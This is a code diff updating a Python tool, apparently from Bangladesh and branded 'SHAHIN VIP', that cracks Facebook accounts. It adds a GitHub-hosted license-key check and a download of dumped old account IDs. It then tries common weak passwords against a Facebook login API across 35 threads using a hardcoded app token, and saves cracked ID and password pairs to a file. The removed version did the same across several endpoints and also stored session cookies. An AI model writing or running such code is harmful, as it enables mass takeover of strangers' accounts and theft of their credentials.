@@ -1,17 +1,45 @@
-import os, time, random, string, re, sys, requests, json, uuid
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os, time, random, sys, requests, uuid
 
 # Colors
-A = '\033[1;97m' 
-R = '\033[1;91m' 
 G = '\033[1;92m' 
 Y = '\033[1;93m' 
+W = '\033[1;97m' 
 S = '\033[1;96m' 
+R = '\033[1;91m'
 
-loop, oks, cps = 0, [], []
+loop, oks = 0, []
 
-def line():
-    print(f'{S}╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸{A}')
+# --- KEY APPROVAL SYSTEM ---
+def approval():
+    os.system('clear')
+    # ইউজার ডিভাইসের আইডি
+    id = str(os.getlogin())
+    key = f"SHAHIN-VIP-{id.upper()}"
+    
+    # আপনার দেওয়া গিটহাব লিঙ্ক
+    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/refs/heads/main/Keys.txt"
+    
+    print(f"{G} [•] WELCOME TO SHAHIN VIP TOOL")
+    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(f" {Y}[!] STATUS : CHECKING APPROVAL...")
+    print(f" {W}[•] YOUR KEY : {G}{key}")
+    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    
+    try:
+        active_keys = requests.get(approval_url).text
+        if key in active_keys:
+            print(f" {G}[√] ACCESS GRANTED! WELCOME SHAHIN BIN AHMED")
+            time.sleep(2)
+            Main()
+        else:
+            print(f" {R}[×] YOUR KEY IS NOT APPROVED")
+            print(f" {W}[•] Send Key to Admin for Permission")
+            input(f" {G}[Enter] To Message Admin on WhatsApp")
+            # এখানে আপনার নম্বরটি দিন
+            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Assalamu%20Alaikum%20Shahin%20Vau,%20Approve%20My%20Key:%20{key}"')
+            exit()
+    except Exception as e:
+        print(f" {R}[!] Network Error! Server not responding."); exit()
 
 def logo():
     os.system('clear')
@@ -20,88 +48,74 @@ def logo():
  ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
  ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
       ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
- ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V15{A}''')
-    line()
-    print(f' {A}[{G}•{A}] OWNER    : {G}SHAHIN BIN AHMED')
-    print(f' {A}[{G}•{A}] TYPE     : {Y}UID LOGIN (OLD ID SPECIAL)')
-    line()
+ ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V20{W}''')
+    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print(f' {W}[{G}•{W}] OWNER    : {G}SHAHIN BIN AHMED')
+    print(f' {W}[{G}•{W}] TARGET   : {Y}OLD ACTIVE (2004-2010)')
+    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 def Main():
     logo()
-    print(f' {G}[1]{A} METHOD M-BASIC {G}(BEST FOR OLD)')
-    print(f' {G}[2]{A} METHOD GRAPH   {S}(BEST FOR SPEED)')
-    print(f' {G}[3]{A} METHOD MOBILE  {Y}(NEW UPDATE)')
-    print(f' {G}[0]{A} EXIT')
-    line()
-    m_opt = input(f' {A}[{G}•{A}] SELECT METHOD : {G}')
+    print(f' {G}[1]{W} CLONE OLD ACTIVE IDS {S}(ONLINE DUMP)')
+    print(f' {G}[2]{W} CLONE FROM YOUR OWN FILE')
+    print(f' {G}[0]{W} EXIT')
+    opt = input(f'\n {W}[{G}•{W}] CHOOSE : {G}')
+    
+    if opt == '1':
+        # অনলাইন ডাম্প ফাইল ডাউনলোড
+        logo()
+        print(f" {W}[•] Downloading Fresh IDs from GitHub...")
+        url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
+        try:
+            data = requests.get(url).text
+            open('dump.txt','w').write(data)
+            start_cloning('dump.txt')
+        except: print("Network Error!"); exit()
+    elif opt == '2':
+        path = input(f" {W}[+] Enter File Path: {G}")
+        start_cloning(path)
+    else: exit()
+
+def start_cloning(file_path):
+    try:
+        ids = open(file_path, 'r').read().splitlines()
+    except: print("File not found!"); exit()
     
     logo()
-    print(f' {G}[1]{A} OLD ID CLONE {Y}(2004-2010)')
-    print(f' {G}[2]{A} BD RANDOM CLONE {S}(UID)')
-    line()
-    t_opt = input(f' {A}[{G}•{A}] SELECT TARGET : {G}')
+    print(f" {W}[•] TOTAL TARGET: {len(ids)}")
+    print(f" {W}[•] TARGET PASS: {Y}123456, 1234567, 123456789")
+    print("-" * 45)
     
-    if t_opt == '1':
-        prefix = random.choice(["10000", "100000"])
-        limit = int(input(f' {A}[{G}+] LIMIT: {G}'))
-        start_crack(prefix, limit, m_opt, is_old=True)
-    else:
-        code = input(f' {A}[{G}+] CODE (017/019): {G}')
-        limit = int(input(f' {A}[{G}+] LIMIT: {G}'))
-        start_crack(code, limit, m_opt, is_old=False)
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    with ThreadPool(max_workers=35) as engine:
+        for user in ids:
+            uid = user.split('|')[0]
+            # আপনার রিকোয়ারমেন্ট অনুযায়ী ওল্ড আইডির গোল্ডেন পাসওয়ার্ড
+            pws = ['123456', '1234567', '12345678', '123456789', '11223344', '55667788', '572737']
+            engine.submit(crack, uid, pws, len(ids))
 
-def start_crack(target, limit, method, is_old):
-    with ThreadPool(max_workers=35) as shahin:
-        logo()
-        print(f' {A}[{G}•{A}] METHOD: {method} | TOTAL: {limit}')
-        line()
-        for _ in range(limit):
-            if is_old:
-                uid = target + ''.join(random.choice(string.digits) for _ in range(6))
-                pws = ['123456', '1234567', '12345678', 'password', '11223344', '572737']
-            else:
-                num = ''.join(random.choice(string.digits) for _ in range(8))
-                uid = target + num
-                pws = [uid, num, uid[:6], uid[:7], 'shahin123', 'shahin786']
-            
-            shahin.submit(engine_v15, uid, pws, method, limit)
-
-def engine_v15(uid, pws, method, limit):
-    global loop, oks, cps
-    ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,124)}.0.0.0 Mobile Safari/537.36"
-    
+def crack(uid, pws, limit):
+    global loop, oks
+    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
     for pw in pws:
         session = requests.Session()
-        if method == '1': # MBASIC
-            url = f'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
-            data = {"lsd":random.randint(111,999),"jazoest":random.randint(111,999),"email":uid,"pass":pw}
-        elif method == '2': # GRAPH
-            url = 'https://b-graph.facebook.com/auth/login'
-            data = {'email': uid, 'password': pw, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json'}
-        else: # MOBILE
-            url = 'https://m.facebook.com/login.php'
-            data = {"email":uid,"pass":pw}
-
-        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded'}
-        
+        headers = {
+            'User-Agent': ua,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+        }
+        data = {'email': uid, 'password': pw, 'format': 'json'}
         try:
-            res = session.post(url, data=data, headers=headers).text
-            if 'session_key' in res or 'c_user' in session.cookies.get_dict():
-                coki = ";".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
-                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{A}')
-                print(f' {Y}[COOKIE] {A}{coki}')
-                line()
+            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
+            if 'session_key' in res:
+                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{W}')
                 oks.append(uid)
-                open('SHAHIN-OK.txt', 'a').write(f'{uid}|{pw}|{coki}\n')
-                break
-            elif 'checkpoint' in res:
-                # print(f'\r\r{Y}[SHAHIN-CP] {uid} | {pw}{A}')
-                cps.append(uid)
+                open('OK.txt', 'a').write(uid+'|'+pw+'\n')
                 break
         except: pass
-
+    global loop
     loop += 1
-    sys.stdout.write(f'\r\r {A}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{A} CP:{Y}{len(cps)}{A} '); sys.stdout.flush()
+    sys.stdout.write(f'\r\r {W}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{W}'); sys.stdout.flush()
 
 if __name__ == "__main__":
-    Main()
+    approval()
